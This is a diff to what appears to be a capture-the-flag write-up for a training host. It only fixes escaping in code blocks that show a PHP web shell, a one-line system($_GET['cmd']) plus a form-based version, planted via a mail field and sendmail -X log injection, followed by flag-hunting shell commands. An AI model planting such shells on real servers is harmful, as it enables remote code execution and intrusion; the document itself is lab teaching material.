@@ -43,28 +43,28 @@ relations@moi.gov.htb -X/var/www/html/rce.php
 Our payload will be a makeshift PHP shell, which we enter into the "Subject" field. The following line would be sufficient:
 
 ```
-&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;
+<?php system($_GET["cmd"]); ?>
 ```
 
 However, this is not very comfortable. We therefore improve the code to include a text field for entering commands and which formats the output:
 
 ```
-&lt;hr /&gt;
-&lt;form action=&quot;rce.php&quot; method=&quot;get&quot;&gt;
-  &lt;input type=&quot;text&quot; 
-    id=&quot;cmd&quot; 
-    name=&quot;cmd&quot; 
-    value=&#039;&lt;?php print($_GET[&quot;cmd&quot;]); ?&gt;&#039; 
+<hr />
+<form action="rce.php" method="get">
+  <input type="text" 
+    id="cmd" 
+    name="cmd" 
+    value='<?php print($_GET["cmd"]); ?>' 
     autofocus 
-    onfocus=&quot;var temp_value=this.value; 
-      this.value=&#039;&#039;; 
-      this.value=temp_value&quot; /&gt;
-&lt;/form&gt;
-&lt;hr /&gt;
-&lt;pre&gt;
-  &lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;
-&lt;/pre&gt;
-&lt;hr /&gt;
+    onfocus="var temp_value=this.value; 
+      this.value=''; 
+      this.value=temp_value" />
+</form>
+<hr />
+<pre>
+  <?php system($_GET["cmd"]); ?>
+</pre>
+<hr />
 ```
 
 After hitting the "Start Delivery" button, we reload the directory listing in order to verify that the file was created correctly. If no file is visible, we have to try different paths. In this case we are lucky on the first try:
@@ -75,7 +75,7 @@ After hitting the "Start Delivery" button, we reload the directory listing in or
 
 We can now open our PHP shell and start looking for the flag. Using the following commands, we are successful:
 
-```
+``` bash
 ls -la
 whoami
 find / -name *flag*
